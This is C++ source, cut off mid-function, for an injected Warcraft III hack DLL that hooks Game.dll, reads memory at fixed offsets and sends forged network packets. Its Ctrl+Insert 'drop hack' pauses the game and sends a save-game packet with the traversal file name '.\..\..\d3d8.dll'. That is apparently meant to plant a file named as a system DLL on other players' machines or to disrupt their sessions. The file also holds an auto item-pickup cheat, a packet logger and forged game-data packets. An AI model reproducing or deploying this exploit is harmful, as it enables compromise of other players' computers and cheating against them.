#define _WIN32_WINNT 0x0501 
#define WINVER 0x0501 
#define NTDDI_VERSION 0x05010000
#define WIN32_LEAN_AND_MEAN
#define PSAPI_VERSION 1
#include <Windows.h>
#include <cstdlib>
//#include "MinHook/MinHook.h"
#include <fstream>
#include <string>
#include <sstream>
#include <iostream>
#include <iomanip>
#include <iomanip>
#include <algorithm>
#include <cassert>
#include <cstdlib>
#include <intrin.h>

struct Packet
{
	DWORD PacketClassPtr;	//+00, some unknown, but needed, Class Pointer
	BYTE* PacketData;		//+04
	DWORD _1;				//+08, zero
	DWORD _2;				//+0C, ??
	DWORD Size;				//+10, size of PacketData
	DWORD _3;				//+14, 0xFFFFFFFF
};

void WatcherLogAddLine(const std::string& line)
{
	std::ofstream outfile("./logFileName.log", std::ios_base::app);
	if (!outfile.bad() && outfile.is_open())
		outfile << line;
	outfile.close();
}


typedef void* (__fastcall* GAME_SendPacket_p) (Packet* packet, DWORD zero);
GAME_SendPacket_p GAME_SendPacket;
GAME_SendPacket_p GAME_SendPacket_ptr;
typedef int(__fastcall* pGetFrameItemAddress)(const char* name, int id);
pGetFrameItemAddress GetFrameItemAddress;


std::string hexStr(const uint8_t* data, int len)
{
	std::stringstream ss;
	ss << std::hex;

	for (int i(0); i < len; ++i)
		ss << std::setw(2) << std::setfill('0') << (int)data[i];

	return ss.str();
}

unsigned char* GameDll = 0;
DWORD MainThread = 0;
HMODULE MainModule = 0;
void* __fastcall GAME_SendPacket_my(Packet* packet, DWORD zero)
{
	void* retval = GAME_SendPacket_ptr(packet, zero);
	int retaddr = (int)_ReturnAddress();
	char tmpstr[256];
	sprintf_s(tmpstr, "%X", retaddr);
	WatcherLogAddLine(tmpstr);
	if (retaddr != (int)(GameDll + 0x43E03C) && packet && packet->Size != 0xFFFFFF && packet->Size && packet->PacketData)
	{
		sprintf_s(tmpstr, "->%s\n", hexStr(packet->PacketData, packet->Size).c_str());
		WatcherLogAddLine(tmpstr);
	}

	return retval;
}


void SendPacket(BYTE* packetData, DWORD size)
{
	// @warning: this function thread-unsafe, do not use it in other thread.
	// note: this is very useful function, in fact this function
	// does wc3 ingame action, so you can use it for anything you want,
	// including unit commands and and gameplay commands,
	// i suppose its wc3 single action W3GS_INCOMING_ACTION (c) wc3noobpl.

	Packet packet;
	memset(&packet, 0, sizeof(Packet));

	packet.PacketClassPtr = (DWORD)(0x932D2C + GameDll); // Packet Class
	packet.PacketData = packetData;
	packet.Size = size;
	packet._2 = 0x5B4;
	packet._3 = 0xFFFFFFFF;
	GAME_SendPacket(&packet, 0);
	//4C2160
}

HHOOK hhookSysMsg = 0;

BOOL InGameFound = FALSE;

DWORD StartTime = GetTickCount();

int IsGame()
{
	if (!GameDll)
		return 0;

	unsigned char* _GameUI = GameDll + 0x93631C;
	unsigned char* InGame = GameDll + 0xACE66C;

	return *(unsigned char**)InGame && **(unsigned char***)InGame == _GameUI;
}

DWORD StartTicks = 0;

DWORD StartTicks2 = 0;

BOOL RealGameStart = FALSE;

#define IsKeyPressed(CODE) ((GetAsyncKeyState(CODE) & 0x8000) > 0)

#ifndef _gist_hex2bytes_h
#define _gist_hex2bytes_h

#include <string>
#include <vector>

template<typename T>
std::vector<T> hex2bytes(const std::string& s)
{
	constexpr size_t width = sizeof(T) * 2;
	std::vector<T> v;
	v.reserve((s.size() + width - 1) / width);
	for (auto it = s.crbegin(); it < s.crend(); it += width)
	{
		auto begin = (std::min)(s.crend(), it + width).base();
		auto end = it.base();
		std::string slice(begin, end);
		T value = std::stoul(slice, 0, 16);
		v.push_back(value);
	}
	return v;
}

#endif

std::string win_1_array[] = { "6b64722e780044617461004d6f646561700001000000",
"6b64722e7800310069640001000000",
"6b64722e7800370069640006000000",
"6b64722e7800320069640002000000",
"6b64722e7800380069640007000000",
"6b64722e7800330069640003000000",
"6b64722e7800390069640008000000",
"6b64722e7800340069640004000000",
"6b64722e780031300069640009000000",
"6b64722e7800350069640005000000",
"6b64722e78003131006964000a000000",
"6b64722e78003100390055303048",
"6b64722e780044617461005055495f310049353049",
"6b64722e780044617461004452495f310049353049",
"6b64722e780044617461004c6576656c32350001000000",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e78004461746100546f7765723131310001000000",
"6b64722e78004461746100546f7765723132310001000000",
"6b64722e78004461746100546f7765723133310001000000",
"6b64722e78004461746100546f7765723134310001000000",
"6b64722e78004461746100546f7765723134310001000000",
"6b64722e780044617461005468726f6e65004b000000",
"6b64722e780044617461005468726f6e650032000000",
"6b64722e780044617461005468726f6e650019000000",
"6b64722e780044617461005468726f6e65000a000000",
"6b64722e78003100310000000000",
"6b64722e78003100320000000000",
"6b64722e78003100330003000000",
"6b64722e78003100340000000000",
"6b64722e78003100350000000000",
"6b64722e780031003600b7c30e00",
"6b64722e78003100370000000000",
"6b64722e78003100385f300031413049",
"6b64722e78003100385f310031413049",
"6b64722e78003100385f320031413049",
"6b64722e78003100385f330031413049",
"6b64722e78003100385f340031413049",
"6b64722e78003100385f350031413049",
"6b64722e78003100390055303048",
"6b64722e7800310069640001000000",
"6b64722e78003700310000000000",
"6b64722e78003700320000000000",
"6b64722e78003700330000000000",
"6b64722e78003700340000000000",
"6b64722e78003700350000000000",
"6b64722e7800370036006f000000",
"6b64722e78003700370000000000",
"6b64722e78003700385f300000000000",
"6b64722e78003700385f310000000000",
"6b64722e78003700385f320000000000",
"6b64722e78003700385f330000000000",
"6b64722e78003700385f340000000000",
"6b64722e78003700385f350000000000",
"6b64722e78003700390000000000",
"6b64722e7800370069640006000000",
"6b64722e78003200310000000000",
"6b64722e78003200320000000000",
"6b64722e78003200330000000000",
"6b64722e78003200340000000000",
"6b64722e78003200350000000000",
"6b64722e780032003600f7040000",
"6b64722e78003200370000000000",
"6b64722e78003200385f300000000000",
"6b64722e78003200385f310000000000",
"6b64722e78003200385f320000000000",
"6b64722e78003200385f330000000000",
"6b64722e78003200385f340000000000",
"6b64722e78003200385f350000000000",
"6b64722e78003200390000000000",
"6b64722e7800320069640002000000",
"6b64722e78003800310000000000",
"6b64722e78003800320000000000",
"6b64722e78003800330000000000",
"6b64722e78003800340000000000",
"6b64722e78003800350000000000",
"6b64722e7800380036006f000000",
"6b64722e78003800370000000000",
"6b64722e78003800385f300000000000",
"6b64722e78003800385f310000000000",
"6b64722e78003800385f320000000000",
"6b64722e78003800385f330000000000",
"6b64722e78003800385f340000000000",
"6b64722e78003800385f350000000000",
"6b64722e78003800390000000000",
"6b64722e7800380069640007000000",
"6b64722e78003300310000000000",
"6b64722e78003300320000000000",
"6b64722e78003300330000000000",
"6b64722e78003300340000000000",
"6b64722e78003300350000000000",
"6b64722e780033003600f7040000",
"6b64722e78003300370000000000",
"6b64722e78003300385f300000000000",
"6b64722e78003300385f310000000000",
"6b64722e78003300385f320000000000",
"6b64722e78003300385f330000000000",
"6b64722e78003300385f340000000000",
"6b64722e78003300385f350000000000",
"6b64722e78003300390000000000",
"6b64722e7800330069640003000000",
"6b64722e78003900310000000000",
"6b64722e78003900320000000000",
"6b64722e78003900330000000000",
"6b64722e78003900340000000000",
"6b64722e78003900350000000000",
"6b64722e7800390036006f000000",
"6b64722e78003900370000000000",
"6b64722e78003900385f300000000000",
"6b64722e78003900385f310000000000",
"6b64722e78003900385f320000000000",
"6b64722e78003900385f330000000000",
"6b64722e78003900385f340000000000",
"6b64722e78003900385f350000000000",
"6b64722e78003900390000000000",
"6b64722e7800390069640008000000",
"6b64722e78003400310000000000",
"6b64722e78003400320000000000",
"6b64722e78003400330000000000",
"6b64722e78003400340000000000",
"6b64722e78003400350000000000",
"6b64722e780034003600f7040000",
"6b64722e78003400370000000000",
"6b64722e78003400385f300000000000",
"6b64722e78003400385f310000000000",
"6b64722e78003400385f320000000000",
"6b64722e78003400385f330000000000",
"6b64722e78003400385f340000000000",
"6b64722e78003400385f350000000000",
"6b64722e78003400390000000000",
"6b64722e7800340069640004000000",
"6b64722e7800313000310000000000",
"6b64722e7800313000320000000000",
"6b64722e7800313000330000000000",
"6b64722e7800313000340000000000",
"6b64722e7800313000350000000000",
"6b64722e780031300036006f000000",
"6b64722e7800313000370000000000",
"6b64722e7800313000385f300000000000",
"6b64722e7800313000385f310000000000",
"6b64722e7800313000385f320000000000",
"6b64722e7800313000385f330000000000",
"6b64722e7800313000385f340000000000",
"6b64722e7800313000385f350000000000",
"6b64722e7800313000390000000000",
"6b64722e780031300069640009000000",
"6b64722e78003500310000000000",
"6b64722e78003500320000000000",
"6b64722e78003500330000000000",
"6b64722e78003500340000000000",
"6b64722e78003500350000000000",
"6b64722e780035003600f7040000",
"6b64722e78003500370000000000",
"6b64722e78003500385f300000000000",
"6b64722e78003500385f310000000000",
"6b64722e78003500385f320000000000",
"6b64722e78003500385f330000000000",
"6b64722e78003500385f340000000000",
"6b64722e78003500385f350000000000",
"6b64722e78003500390000000000",
"6b64722e7800350069640005000000",
"6b64722e7800313100310000000000",
"6b64722e7800313100320000000000",
"6b64722e7800313100330000000000",
"6b64722e7800313100340000000000",
"6b64722e7800313100350000000000",
"6b64722e780031310036006f000000",
"6b64722e7800313100370000000000",
"6b64722e7800313100385f300000000000",
"6b64722e7800313100385f310000000000",
"6b64722e7800313100385f320000000000",
"6b64722e7800313100385f330000000000",
"6b64722e7800313100385f340000000000",
"6b64722e7800313100385f350000000000",
"6b64722e7800313100390000000000",
"6b64722e78003131006964000a000000",
"6b64722e7800476c6f62616c0057696e6e65720001000000",
"6b64722e7800476c6f62616c006d0001000000",
"6b64722e7800476c6f62616c0073002e0000006b64722e780044617461004d6f646561700001000000",
"6b64722e7800310069640001000000",
"6b64722e7800370069640006000000",
"6b64722e7800320069640002000000",
"6b64722e7800380069640007000000",
"6b64722e7800330069640003000000",
"6b64722e7800390069640008000000",
"6b64722e7800340069640004000000",
"6b64722e780031300069640009000000",
"6b64722e7800350069640005000000",
"6b64722e78003131006964000a000000",
"6b64722e78003100390055303048",
"6b64722e780044617461005055495f310049353049",
"6b64722e780044617461004452495f310049353049",
"6b64722e780044617461004c6576656c32350001000000",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e780044617461005055495f310039343049",
"6b64722e780044617461004452495f310039343049",
"6b64722e780044617461005055495f310058343049",
"6b64722e78004461746100546f7765723131310001000000",
"6b64722e78004461746100546f7765723132310001000000",
"6b64722e78004461746100546f7765723133310001000000",
"6b64722e78004461746100546f7765723134310001000000",
"6b64722e78004461746100546f7765723134310001000000",
"6b64722e780044617461005468726f6e65004b000000",
"6b64722e780044617461005468726f6e650032000000",
"6b64722e780044617461005468726f6e650019000000",
"6b64722e780044617461005468726f6e65000a000000",
"6b64722e78003100310000000000",
"6b64722e78003100320000000000",
"6b64722e78003100330003000000",
"6b64722e78003100340000000000",
"6b64722e78003100350000000000",
"6b64722e780031003600b7c30e00",
"6b64722e78003100370000000000",
"6b64722e78003100385f300031413049",
"6b64722e78003100385f310031413049",
"6b64722e78003100385f320031413049",
"6b64722e78003100385f330031413049",
"6b64722e78003100385f340031413049",
"6b64722e78003100385f350031413049",
"6b64722e78003100390055303048",
"6b64722e7800310069640001000000",
"6b64722e78003700310000000000",
"6b64722e78003700320000000000",
"6b64722e78003700330000000000",
"6b64722e78003700340000000000",
"6b64722e78003700350000000000",
"6b64722e7800370036006f000000",
"6b64722e78003700370000000000",
"6b64722e78003700385f300000000000",
"6b64722e78003700385f310000000000",
"6b64722e78003700385f320000000000",
"6b64722e78003700385f330000000000",
"6b64722e78003700385f340000000000",
"6b64722e78003700385f350000000000",
"6b64722e78003700390000000000",
"6b64722e7800370069640006000000",
"6b64722e78003200310000000000",
"6b64722e78003200320000000000",
"6b64722e78003200330000000000",
"6b64722e78003200340000000000",
"6b64722e78003200350000000000",
"6b64722e780032003600f7040000",
"6b64722e78003200370000000000",
"6b64722e78003200385f300000000000",
"6b64722e78003200385f310000000000",
"6b64722e78003200385f320000000000",
"6b64722e78003200385f330000000000",
"6b64722e78003200385f340000000000",
"6b64722e78003200385f350000000000",
"6b64722e78003200390000000000",
"6b64722e7800320069640002000000",
"6b64722e78003800310000000000",
"6b64722e78003800320000000000",
"6b64722e78003800330000000000",
"6b64722e78003800340000000000",
"6b64722e78003800350000000000",
"6b64722e7800380036006f000000",
"6b64722e78003800370000000000",
"6b64722e78003800385f300000000000",
"6b64722e78003800385f310000000000",
"6b64722e78003800385f320000000000",
"6b64722e78003800385f330000000000",
"6b64722e78003800385f340000000000",
"6b64722e78003800385f350000000000",
"6b64722e78003800390000000000",
"6b64722e7800380069640007000000",
"6b64722e78003300310000000000",
"6b64722e78003300320000000000",
"6b64722e78003300330000000000",
"6b64722e78003300340000000000",
"6b64722e78003300350000000000",
"6b64722e780033003600f7040000",
"6b64722e78003300370000000000",
"6b64722e78003300385f300000000000",
"6b64722e78003300385f310000000000",
"6b64722e78003300385f320000000000",
"6b64722e78003300385f330000000000",
"6b64722e78003300385f340000000000",
"6b64722e78003300385f350000000000",
"6b64722e78003300390000000000",
"6b64722e7800330069640003000000",
"6b64722e78003900310000000000",
"6b64722e78003900320000000000",
"6b64722e78003900330000000000",
"6b64722e78003900340000000000",
"6b64722e78003900350000000000",
"6b64722e7800390036006f000000",
"6b64722e78003900370000000000",
"6b64722e78003900385f300000000000",
"6b64722e78003900385f310000000000",
"6b64722e78003900385f320000000000",
"6b64722e78003900385f330000000000",
"6b64722e78003900385f340000000000",
"6b64722e78003900385f350000000000",
"6b64722e78003900390000000000",
"6b64722e7800390069640008000000",
"6b64722e78003400310000000000",
"6b64722e78003400320000000000",
"6b64722e78003400330000000000",
"6b64722e78003400340000000000",
"6b64722e78003400350000000000",
"6b64722e780034003600f7040000",
"6b64722e78003400370000000000",
"6b64722e78003400385f300000000000",
"6b64722e78003400385f310000000000",
"6b64722e78003400385f320000000000",
"6b64722e78003400385f330000000000",
"6b64722e78003400385f340000000000",
"6b64722e78003400385f350000000000",
"6b64722e78003400390000000000",
"6b64722e7800340069640004000000",
"6b64722e7800313000310000000000",
"6b64722e7800313000320000000000",
"6b64722e7800313000330000000000",
"6b64722e7800313000340000000000",
"6b64722e7800313000350000000000",
"6b64722e780031300036006f000000",
"6b64722e7800313000370000000000",
"6b64722e7800313000385f300000000000",
"6b64722e7800313000385f310000000000",
"6b64722e7800313000385f320000000000",
"6b64722e7800313000385f330000000000",
"6b64722e7800313000385f340000000000",
"6b64722e7800313000385f350000000000",
"6b64722e7800313000390000000000",
"6b64722e780031300069640009000000",
"6b64722e78003500310000000000",
"6b64722e78003500320000000000",
"6b64722e78003500330000000000",
"6b64722e78003500340000000000",
"6b64722e78003500350000000000",
"6b64722e780035003600f7040000",
"6b64722e78003500370000000000",
"6b64722e78003500385f300000000000",
"6b64722e78003500385f310000000000",
"6b64722e78003500385f320000000000",
"6b64722e78003500385f330000000000",
"6b64722e78003500385f340000000000",
"6b64722e78003500385f350000000000",
"6b64722e78003500390000000000",
"6b64722e7800350069640005000000",
"6b64722e7800313100310000000000",
"6b64722e7800313100320000000000",
"6b64722e7800313100330000000000",
"6b64722e7800313100340000000000",
"6b64722e7800313100350000000000",
"6b64722e780031310036006f000000",
"6b64722e7800313100370000000000",
"6b64722e7800313100385f300000000000",
"6b64722e7800313100385f310000000000",
"6b64722e7800313100385f320000000000",
"6b64722e7800313100385f330000000000",
"6b64722e7800313100385f340000000000",
"6b64722e7800313100385f350000000000",
"6b64722e7800313100390000000000",
"6b64722e78003131006964000a000000",
"6b64722e7800476c6f62616c0057696e6e65720001000000",
"6b64722e7800476c6f62616c006d0001000000",
"6b64722e7800476c6f62616c0073002e000000" };

bool foundgame = false;

unsigned char* pW3XGlobalClass = 0;

int SafeItemCount = 1;
int SafeItemArraySize = 1;
int* SafeItemArray = new int[1] {0};
void FillItemCountAndItemArray()
{
	int GlobalClassOffset = *(int*)(pW3XGlobalClass);
	if (GlobalClassOffset > 0)
	{
		int ItemsOffset1 = *(int*)(GlobalClassOffset + 0x3BC) + 0x10;
		if (ItemsOffset1 > 0)
		{
			int* ItemsCount = (int*)(ItemsOffset1 + 0x604);
			if (ItemsCount
				&& *ItemsCount > 0)
			{
				int* Itemarray = (int*)*(int*)(ItemsOffset1 + 0x608);


				if (SafeItemArraySize < *ItemsCount)
				{
					delete[]SafeItemArray;
					SafeItemArraySize = *ItemsCount;
					SafeItemArray = new int[SafeItemArraySize + 1];
				}
				SafeItemCount = *ItemsCount;
				memcpy(SafeItemArray, Itemarray, 4 * SafeItemCount);
				return;
			}
		}
	}

	memset(SafeItemArray, 0, 4 * SafeItemCount);
}
unsigned char* ItemVtable = 0;
BOOL IsNotBadItem(int itemaddr)
{
	if (itemaddr > 0)
	{
		bool ItemFoundInArray = false;

		for (int i = 0; i < SafeItemCount; i++)
		{
			if (SafeItemArray[i] == itemaddr)
				ItemFoundInArray = true;
		}

		if (ItemFoundInArray)
		{
			int xaddraddr = (int)&ItemVtable;

			if (*(BYTE*)xaddraddr != *(BYTE*)itemaddr)
				return FALSE;
			else if (*(BYTE*)(xaddraddr + 1) != *(BYTE*)(itemaddr + 1))
				return FALSE;
			else if (*(BYTE*)(xaddraddr + 2) != *(BYTE*)(itemaddr + 2))
				return FALSE;
			else if (*(BYTE*)(xaddraddr + 3) != *(BYTE*)(itemaddr + 3))
				return FALSE;

			if (*(int*)(itemaddr + 0x20) & 1)
				return FALSE;

			float hitpoint = *(float*)(itemaddr + 0x58);
			return hitpoint > 0.0f;
		}
	}

	return FALSE;
}



void GetItemLocation3D(int itemaddr, float* x, float* y, float* z)
{
	if (itemaddr)
	{
		int iteminfo = *(int*)(itemaddr + 0x28);
		if (iteminfo)
		{
			*x = *(float*)(iteminfo + 0x88);
			*y = *(float*)(iteminfo + 0x8C);
			//*z = *(float*)(iteminfo + 0x90);
			*z = 0.0f;
		}
		else
		{
			*x = 0.0f;
			*y = 0.0f;
			*z = 0.0f;
		}
	}
	else
	{
		*x = 0.0f;
		*y = 0.0f;
		*z = 0.0f;
	}
}

float Distance3D(float x1, float y1, float z1, float x2, float y2, float z2)
{
	double d[] = { abs((double)x1 - (double)x2), abs((double)y1 - (double)y2), abs((double)z1 - (double)z2) };
	if (d[0] < d[1]) std::swap(d[0], d[1]);
	if (d[0] < d[2]) std::swap(d[0], d[2]);
	return (float)(d[0] * sqrt(1.0 + d[1] / d[0] + d[2] / d[0]));
}

float Distance2D(float x1, float y1, float x2, float y2)
{
	return Distance3D(x1, y1, 1.0f, x2, y2, 1.0f);
}

void GetUnitLocation3D(int unitaddr, float* x, float* y, float* z)
{
	if (unitaddr)
	{
		*x = *(float*)(unitaddr + 0x284);
		*y = *(float*)(unitaddr + 0x288);
		*z = *(float*)(unitaddr + 0x28C);
	}
	else
	{
		*x = 0.0f;
		*y = 0.0f;
		*z = 0.0f;
	}
}

void* GetGlobalPlayerData()
{
	if (*(int*)(0xAB65F4 + GameDll) > 0)
	{
		return (void*)*(int*)(0xAB65F4 + GameDll);
	}
	else
		return nullptr;
}

int GetPlayerByNumber(int number)
{
	if (number == -1)
		return -1;

	void* arg1 = GetGlobalPlayerData();
	int result = -1;
	if (arg1 != nullptr && arg1)
	{
		result = (int)arg1 + (number * 4) + 0x58;
		result = *(int*)result;
	}
	return result;
}

int GetLocalPlayerNumber()
{
	void* gldata = GetGlobalPlayerData();
	if (gldata != nullptr && gldata)
	{
		int playerslotaddr = (int)gldata + 0x28;
		return (int)*(short*)(playerslotaddr);
	}
	else
		return -1;
}


int GetLocalPlayer()
{
	return GetPlayerByNumber(GetLocalPlayerNumber());
}

UINT GetUnitOwnerSlot(int unitaddr)
{
	return *(int*)(unitaddr + 88);
}


int GetSelectedOwnedUnit()
{
	int plr = GetLocalPlayer();
	if (plr != -1 && plr)
	{

		int unitaddr = 0; // = *(int*)((*(int*)plr+0x34)+0x1e0);

		__asm
		{
			MOV EAX, plr;
			MOV ECX, DWORD PTR DS : [EAX + 0x34] ;
			MOV EAX, DWORD PTR DS : [ECX + 0x1E0] ;
			MOV unitaddr, EAX;
		}

		if (unitaddr > 0)
		{
			if (GetUnitOwnerSlot(unitaddr) == GetLocalPlayerNumber())
			{
				return unitaddr;
			}
		}
	}
	return NULL;
}


#define ADDR(X,REG)\
	__asm MOV REG, DWORD PTR DS : [ X ] \
	__asm MOV REG, DWORD PTR DS : [ REG ]

void __stdcall ItemOrder(int itemaddr_a3, int orderid_a1 = 0xd0003, int unknown_a2 = 0, unsigned int unknown_a4 = 4, unsigned int unknown_a5 = 0)
{
	unsigned char * ItemOrderAddr = GameDll + 0x339D50;
	__asm
	{

		PUSH unknown_a5;
		PUSH unknown_a4;
		ADDR(pW3XGlobalClass, ECX);
		MOV ECX, DWORD PTR DS : [ECX + 0x1B4] ;
		PUSH itemaddr_a3;
		PUSH unknown_a2;
		PUSH orderid_a1;
		CALL ItemOrderAddr;
	}
}


int sub_6F5BE670()
{
	return (int)(GameDll + 0xACCE94);
}

unsigned char * sub_6F5C2E30_addr = 0;

__declspec(naked) void __fastcall sub_6F5C2E30(int a1, int unused, char a2)
{
	__asm
	{ JMP sub_6F5C2E30_addr }
}

int GetRandomHandi()
{
	return (5 + (rand() % 5)) * 10;
}

int INIT_DROP_HACK = 0;

DWORD DROP_TICKS = 0;

LRESULT CALLBACK HookCallWndProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < HC_ACTION)
		return CallNextHookEx(hhookSysMsg, nCode, wParam, lParam);

	if (GetCurrentThreadId() == MainThread && GetTickCount() - StartTicks > 15)
	{
		StartTicks = GetTickCount();

		try
		{
			/*	if (GetFrameItemAddress("GameFilterButton", 0))
				{
					if (GetModuleHandleA("war3map.dll"))
					{
						FreeLibrary(GetModuleHandleA("war3map.dll"));
					}
					if (GetModuleHandleA("war3map.override.dll"))
					{
						FreeLibrary(GetModuleHandleA("war3map.override.dll"));
					}
				}*/

				//	if (IsKeyPressed('9'))
				//	{
				//		if (!RealGameStart)
				//		{
				//			for (auto& s : win_1_array)
				//			{
				//				auto bytes = hex2bytes<unsigned char>(s);
				//				std::reverse(bytes.begin(),bytes.end());
				//				for(int i = 0; i < 20; i++)
				//				{
				//					bytes.push_back(i);
				//					SendPacket(&bytes[0], bytes.size());
				//					bytes.pop_back();
				//				}
				//			}
				//			Beep(1000, 1000);
				//		}
				//		RealGameStart = TRUE;
				//	}
				//	else
				//	{
				//		RealGameStart = FALSE;
				//	}


			if (IsGame())
			{
				if (!foundgame && IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_INSERT))
				{
					INIT_DROP_HACK = 1;
					foundgame = true;
				}

				//if (INIT_DROP_HACK == 1)
				//{
				//	// CLEAR WITH 255
				//	char tmpdata[64];
				//	memset(tmpdata, 0xFF, 64);
				//	SendPacket((BYTE*)tmpdata, 32);
				//	INIT_DROP_HACK++;
				//	DROP_TICKS = GetTickCount();
				//}
				//else if (INIT_DROP_HACK == 2 && GetTickCount() - DROP_TICKS > 50)
				//{

				//	// CLEAR WITH ZEROES
				//	char tmpdata[64];
				//	memset(tmpdata, 0, 64);
				//	SendPacket((BYTE*)tmpdata, 32);
				//	INIT_DROP_HACK++;
				//	DROP_TICKS = GetTickCount();
				//}
				//else 
				if (INIT_DROP_HACK == 1)
				{
					// PAUSE GAME
					SendPacket((BYTE*)"\x02", 1);
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();
				}
				else if (INIT_DROP_HACK == 2 && GetTickCount() - DROP_TICKS > 100)
				{
					// PAUSE GAME
					SendPacket((BYTE*)"\x02", 1);
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();
				}
				else if (INIT_DROP_HACK == 3 && GetTickCount() - DROP_TICKS > 100)
				{
					// PAUSE GAME
					SendPacket((BYTE*)"\x02", 1);
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();
				}
				else if (INIT_DROP_HACK == 4 && GetTickCount() - DROP_TICKS > 50)
				{
					// PAUSE GAME
					SendPacket((BYTE*)"\x02", 1);
					// SAVE GAME
					const char* baddata = "\x06.\\..\\..\\d3d8.dll";
					SendPacket((BYTE*)baddata, strlen(baddata) + 1);
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();
				}
				else if (INIT_DROP_HACK == 5 && GetTickCount() - DROP_TICKS > 50)
				{
					// RESUME GAME
					SendPacket((BYTE*)"\x01", 1);
					SendPacket((BYTE*)"\x01", 1);
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();
				}
				else if (INIT_DROP_HACK == 6 && GetTickCount() - DROP_TICKS > 50)
				{
					// SAVE GAME COMPLETED
					SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);
					SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);
					INIT_DROP_HACK = 0;
					DROP_TICKS = GetTickCount();
				}


				if (GetTickCount() - StartTicks2 > 2500 && INIT_DROP_HACK == 0)
				{
					StartTicks2 = GetTickCount();
					if (foundgame)
					{
						SendPacket((BYTE*)"\x07", 1);
						DeleteFileA(".\\d3d8.dll");
					}
					SendPacket((BYTE*)"\x00", 1);
					SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
				}

			/*	if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_DELETE))
				{
#pragma pack(1)
					struct PackGold
					{
						unsigned char cmd;
						unsigned char pid;
						unsigned int gold;
						unsigned int wood;
					};
#pragma pop
					PackGold tmpPackGold;
					tmpPackGold.gold = 250;
					tmpPackGold.wood = 1;
					tmpPackGold.cmd = 0x51;
					for (unsigned char i = 0; i <= 11; i++)
					{
						tmpPackGold.pid = i;
						SendPacket((BYTE*)&tmpPackGold, sizeof(PackGold));
					}
				}*/

				if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F1))
				{
					int unitaddr = GetSelectedOwnedUnit();
					if (unitaddr)
					{
						FillItemCountAndItemArray();
						float unitx = 0.0f, unity = 0.0f, unitz = 0.0f;
						GetUnitLocation3D(unitaddr, &unitx, &unity, &unitz);
						float bestdist = 9999.9f;
						int itembestdist = -1;
						for (int i = 0; i < SafeItemCount; i++)
						{
							if (SafeItemArray[i])
							{
								if (IsNotBadItem(SafeItemArray[i]))
								{
									float itemx = 0.0f, itemy = 0.0f, itemz = 0.0f;
									GetItemLocation3D(SafeItemArray[i], &itemx, &itemy, &itemz);
									if (Distance2D(itemx, itemy, unitx, unity) < bestdist)
									{
										bestdist = Distance2D(itemx, itemy, unitx, unity);
										itembestdist = i;
									}
								}
							}
						}

						if (itembestdist > 0 && bestdist < 200.0f)
						{
							ItemOrder(SafeItemArray[itembestdist]);
						}
					}
				}
			}
			else
			{
				/*if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_DELETE))
				{
					sub_6F5C2E30(sub_6F5BE670(), 0, GetRandomHandi());
				}*/
				foundgame = false;
			}
		}
		catch (...)
		{
			if (IsKeyPressed(VK_LCONTROL))
			{
				Beep(1500, 1500);
			}
		}
	}

	return CallNextHookEx(hhookSysMsg, nCode, wParam, lParam);
}

BOOL __stdcall DllMain(HINSTANCE hDLL, unsigned int r, LPVOID)
{
	if (r == DLL_PROCESS_ATTACH)
	{
		if (!GetModuleHandleA("Game.dll"))
		{
			return FALSE;
		}
		StartTicks = GetTickCount();
		MainModule = hDLL;
		MainThread = GetCurrentThreadId();
		GameDll = (unsigned char*)GetModuleHandleA("Game.dll");
		if (hhookSysMsg == 0)
			hhookSysMsg = SetWindowsHookExW(WH_GETMESSAGE, HookCallWndProc, GetModuleHandleA("Game.dll"), GetCurrentThreadId());

		sub_6F5C2E30_addr = GameDll + 0x5C2E30;
		ItemVtable = GameDll + 0x9320B4;
		pW3XGlobalClass = (GameDll + 0xAB4F80);
		GAME_SendPacket = (GAME_SendPacket_p)(GameDll + 0x54D970);
		GetFrameItemAddress = (pGetFrameItemAddress)((DWORD)GameDll + 0x5FA970);
		/*	MH_Initialize();
			MH_CreateHook(GAME_SendPacket, &GAME_SendPacket_my, reinterpret_cast<void**>(&GAME_SendPacket_ptr));
			MH_EnableHook(GAME_SendPacket);
	*/

	/*	char tmpbuf[256];
		sprintf_s(tmpbuf, "iccwc3:%X gamedll:%X reconnect:%X mainmodule:%X\n", (int)GetModuleHandleA("iccwc3.icc"),
			(int)GetModuleHandleA("game.dll"), (int)GetModuleHandleA("reconnect.dll"), (int)hDLL);
		WatcherLogAddLine(tmpbuf);*/
	}
	else if (r == DLL_PROCESS_DETACH)
	{
		if (hhookSysMsg != 0)
			UnhookWindowsHookEx(hhookSysMsg);
		/*	MH_DisableHook(MH_ALL_HOOKS);
			MH_Uninitialize();*/
